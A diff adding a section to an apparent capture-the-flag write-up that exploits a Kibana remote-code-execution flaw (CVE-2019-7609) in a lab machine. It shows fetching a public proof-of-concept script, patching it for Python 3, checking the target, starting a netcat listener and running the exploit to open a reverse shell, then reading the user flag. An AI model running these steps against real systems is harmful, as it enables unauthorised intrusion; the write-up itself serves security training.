@@ -127,3 +127,51 @@ I do another google search for "cve-2019-7609 poc". I get a hit with this one. I
 ```bash
 $ wget https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/refs/heads/master/CVE-2019-7609-kibana-rce.py
 ```
+
+## Compromise the machine and locate user.txt
+
+The script wants a url to the kibana instance, it also wants the reverse shell url and port number. There is one more argument that will call the reverse shell but if that argument is not provided the script just verifies that the Kibana instance is vulnerable.
+
+I make some changes to the script so that it will work with python3. They are the following:
+
+- Line 23: Add `.decode('utf-8')` after r.content
+- Line 57: Add `.decode('utf-8')` after r.content
+
+After the changes, I check to make sure the Kibana instance is vulnerable with the following command:
+
+```bash
+$ python3 CVE-2019-7609-kibana-rce.py -u http://target.thm:5601
+[+] http://target.thm:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
+```
+
+I open a new terminal on my attack box and run the following to start a reverse shell listener:
+
+```bash
+$ nc -lvnp 4444
+```
+
+Then I run the following:
+
+```bash
+$ python3 CVE-2019-7609-kibana-rce.py -u http://10.10.223.67:5601 -host <attack_box_ip> -port 4444 --shell
+[+] http://10.10.223.67:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
+[+] reverse shell completely! please check session on: <attack_box_ip>:4444
+```
+
+I have a shell. I'm in!
+
+I follow the [steps here](../../README.md#stable-shell) to get a stable shell.
+
+I run the following to see what users have a home directory:
+
+```bash
+$ ls -lh /home
+kiba
+```
+
+I then cat the file in that directory:
+
+```bash
+$ cat /home/kiba/user.txt
+REDACTED
+```
